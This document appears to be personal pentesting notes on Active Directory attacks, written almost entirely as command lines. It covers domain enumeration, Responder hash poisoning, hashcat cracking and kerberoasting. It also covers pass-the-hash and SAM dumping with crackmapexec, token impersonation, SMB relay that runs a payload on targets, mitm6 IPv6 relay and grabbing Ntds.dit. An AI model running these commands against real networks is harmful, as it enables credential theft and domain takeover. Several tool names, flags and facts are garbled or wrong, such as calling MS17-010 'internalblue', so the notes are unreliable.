
# Windows Server 2019
- Enable AD
- Enable AD DC
- Run/Group Policy Management App
  - setspn -a $DC/$UDN:6011 $D\$U
  - setspn -T $D.local -Q */*
- Grab the %SytemRoot\NTDS%Ntds.dit file
  - Workstations configured to use AD DC as DNS via IP 
  - add ad user as local admin
- Features
  - 
# Post Enum
- powershell -ep bypass
- . ./PowerView.ps1 # https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
  - Get-NetDomain
  - Get-NetDomainController
  - Get-NetComputer -FullData
  - Get-DomainPolicy
    - (Get-DomainPolicy)."system access"
  - Get-NetUser | select cn
  - Get-NetGroup
  - Get-NetGroupMember -Groupname "Domains Admin"
  - Get-UserProperty -Properties pwdlastset logoncount #no logons might be honeypot
  - Invoke-ShareFinder
  - Get_NetGPO
- Spretre Ops Bloudhound
  - opt install bloodhoud
    - neo4j console (u/p:neo4j)
    - bloudhound
    - . .\SharpHound.ps1
    - Invoke-bloodhound -CollectionMethod All -ZipFileName output.zip

# Notes
  - AD users kerberos
  - linux and mac via RADIUS and LDAP

# Internal
- try to get an admin to log on your machine
  - use mimikats to pass the hash
- be loud to help blue team sync up
- Active Directory Attacks
  - Netbios amd LLMNR/NBT-NS Poisoning
    - use social engineering or phishing to get bad dns requests
    - python Responder.py -I eth0 -rdwv
    - hashcat -m 5680 $hashes.txt $passwords.txt -O--force
    - NTLMv2 hash
  - Pass the hash
    - apt install crackmapexec
    - crackmapexec $subnet -u $user -d $domain -p $password
    - crackmapexec $subnet -u $user -d $domain -H $hash --local
    - crackmapexec $subnet -u $user -d $domain -p $password --sam
  - Token Impersonation
    - https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
    - meterpreter> load incognito
    - meterpreter> list_tokens -u
    - meterpreter> impersonate_token $domain\\$user
  - SMB Relay
    - nmap --script=smb2-security-mode.nse -p445 $sn # look for enabled or not targets.txt req.
    - python Responder.py -I eth0 -rdwv
    - python ntlmrelayx.py itf $targets.txt -i
    - python ntlmrelayx.py itf $targets.txt -e test.exe
    - msfconsole
      - search psexec
    - psexec.py
    - smbexec.py
    - wmiexec.py
  - kerboroasting
    - python GetUserSPNs.py $D.local/user:passsword -dc-ip $ip -request
    - hashcat -m 13100 $hashes.txt $passwords.txt -O--force
  - GPP
    - windows 2012
    - gpp-decrpt
  - IPV6 attacks
    - mitm6 
      - dns spoofing
      - dc
      - smb 
      - lpap
        - ntlmrelayx.py -6 -t ldaps://$dc -wh fakepad.$d.local -l lootme
        - get machines to reboot, or wait for a reboot
      - ldap relaying via ntlm
  - ms17-010 aka internalblue.
  